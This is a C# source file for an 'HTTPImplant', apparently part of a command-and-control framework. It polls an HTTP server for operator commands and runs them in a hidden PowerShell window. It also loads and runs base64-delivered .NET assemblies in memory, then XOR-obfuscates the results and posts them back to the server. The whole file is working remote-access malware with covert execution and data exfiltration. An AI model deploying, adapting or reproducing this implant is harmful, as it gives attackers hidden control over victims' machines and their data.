using System;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Text;
using System.Timers;
using HTTPImplant.Modules;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace HTTPImplant
{
    // This Implant class acts as the entry point of the implant program.
    public class Implant
    {

        public string host { get; set; }  // Host of the implant server
        public string port { get; set; }  // Port of the implant server
        private static string lastCommandExecuted = string.Empty; // Store the last command that was executed

        public static void Main(string[] args)
        {
            DoAsync().GetAwaiter().GetResult();
        }
        public static async Task DoAsync()
        {
            string implantId = Environment.MachineName;
            string lastCommandExecuted = string.Empty;

            using (WebClient webClient = new WebClient())
            {
                while (true)
                {
                    try
                    {
                        string jsonResponse = await webClient.DownloadStringTaskAsync(new Uri("http://127.0.0.1:8081/fetchCommand"));

                        Command command = new Command();
                        command.Input = jsonResponse.Split(new string[] { "\"Input\":\"", "\",\"ImplantUser" }, StringSplitOptions.None)[1];
                        command.ImplantUser = jsonResponse.Split(new string[] { "\"ImplantUser\":\"", "\",\"Operator" }, StringSplitOptions.None)[1];
                        command.Operator = jsonResponse.Split(new string[] { "\"Operator\":\"", "\",\"timeToExec" }, StringSplitOptions.None)[1];
                        command.TimeToExec = jsonResponse.Split(new string[] { "\"timeToExec\":\"", "\",\"delay" }, StringSplitOptions.None)[1];
                        command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"File" }, StringSplitOptions.None)[1];
                        command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"Command" }, StringSplitOptions.None)[1];
                        command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\"}" }, StringSplitOptions.None)[1];

                        await Task.Delay(5000);

                        if (command.command == lastCommandExecuted)
                            continue;

                        lastCommandExecuted = command.command;

                        if (command.Input.Trim().Equals("os", StringComparison.OrdinalIgnoreCase))
                        {
                            ProcessStartInfo processStartInfo = new ProcessStartInfo
                            {
                                FileName = "powershell.exe",
                                Arguments = "-NoLogo -NonInteractive -NoProfile -Command " + command.command,
                                RedirectStandardOutput = true,
                                UseShellExecute = false,
                                CreateNoWindow = true
                            };

                            Process process = new Process
                            {
                                StartInfo = processStartInfo
                            };

                            process.Start();

                            string output = process.StandardOutput.ReadToEnd();
                            process.WaitForExit();

                            string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
                            await SendResult(webClient, implantId, command.Operator, outputBase64);
                        }
                        else if (command.Input.Trim().Equals("execute-assembly", StringComparison.OrdinalIgnoreCase))
                        {
                            byte[] bytes = Convert.FromBase64String(command.File);
                            string output = ExecuteAssembly.Execute(bytes);
                            string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
                            await SendResult(webClient, implantId, command.Operator, outputBase64);
                        }
                    }
                    catch (Exception e)
                    {
                    }
                }
            }
        }

        public static async Task SendResult(WebClient webClient, string implantId, string operatorId, string outputBase64)
        {
            string XORKeyB64 = "NVm5dzr1hyhOm4jBTNSFhQGrFhR1gvhbn/BbvZowkO0=";
            byte[] XORKey = Convert.FromBase64String(XORKeyB64);

            string resultJson = "{" + "\"ImplantId\": \"" + implantId + "\"," + "\"OperatorId\": \"" + operatorId + "\"," + "\"Output\": \"" + outputBase64 + "\"," + "\"DateFromLast\": \"" + DateTime.UtcNow.ToString("O") + "\"" + "}";
            byte[] encryptedResultJson = XOR(Encoding.UTF8.GetBytes(resultJson), XORKey);

            string data = Convert.ToBase64String(encryptedResultJson);
            await webClient.UploadStringTaskAsync(new Uri("http://127.0.0.1:8081/fetchOutput"), "POST", data);
        }

        public static byte[] XOR(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }

    }

    // The Command class represents a command that is sent from the server.
    public class Command
    {
        public string Input { get; set; }
        public string ImplantUser { get; set; }
        public string Operator { get; set; }
        public string TimeToExec { get; set; }
        public string Delay { get; set; }
        public string File { get; set; }
        public string command { get; set; }
    }
}
